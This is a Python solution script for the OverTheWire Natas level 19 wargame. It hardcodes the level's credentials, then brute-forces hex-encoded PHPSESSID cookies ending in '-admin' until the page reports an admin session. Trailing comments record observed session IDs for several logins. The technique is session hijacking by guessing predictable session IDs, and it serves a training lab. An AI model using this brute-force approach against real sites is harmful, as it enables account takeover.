import os
import urllib.request as url
import urllib.parse
import string
import time

NATAS_URL = 'http://natas19.natas.labs.overthewire.org'
NATAS_USERNAME = 'natas19'
NATAS_PWD = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
PASSWORD_LENGTH = 33


def initialPageConnexion():
    '''
    Connects to the page with the given credentials. This function
    has to be called before trying anything on the webpage.
    '''
    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password(
        'Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    # This commented out tactic also works. The website accepts the Authorization header
    # after having connected at least once

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    # with open('output.html', 'w') as file:
    #     file.write(output.read().decode())


def isCorrectInput(string):
    '''
    Determines if the string is the correct id or not

        Parameters:
            string : The id

        Returns:
            True if the id is correct. False otherwise
    '''
    request = urllib.parse.urlencode(
        {'username': 'admin', 'password': 'admin'})
    request = request.encode('ascii')

    post_request = url.Request(NATAS_URL, request)
    post_request.add_header('Cookie', f'PHPSESSID={string}')

    output = url.urlopen(post_request)

    html_page = output.read().decode()

    return True if html_page.find('You are an admin.') != -1 else False


if __name__ == "__main__":

    initialPageConnexion()

    # =======================================================================================
    # This part creates a list of letters that are in the password. I commented it out
    # because it takes some time to run so I want to avoid running it too often
    # =======================================================================================

    hexValues = ['0', '1', '2', '3', '4', '5', '6',
                 '7', '8', '9']

    for id1 in hexValues:
        for id2 in hexValues:
            for id3 in hexValues:
                id = str(id1) + str(id2) + str(id3)
                adjustedId = '3' + id[0] + '3' + id[1] + '3' + id[2] + '2d61646d696e'
                print(f'Trying id = {adjustedId}...')
                if isCorrectInput(adjustedId):
                    print(f'Admin sesion id: {id}')
                    exit()

# 36302d61646d696e
# 34392d61646d696e
# 3536372d61646d696e
# 3237312d61646d696e
# 32322d61646d696e
# 31342d61646d696e

# admin/admin       :       38312d61646d696e
# admin/admin1      :       3134322d61646d696e
# admin/admin123    :       3339362d61646d696e
# admin/password    :       3539372d61646d696e
# admin1/password   :       3532352d61646d696e31
# admin123/password :       3631392d61646d696e313233
# admin54321/password:      38362d61646d696e3534333231
# adminadmin/password:      35382d61646d696e61646d696e
# admin/            :       3437362d61646d696e
# admin1/password (2):      3633302d61646d696e31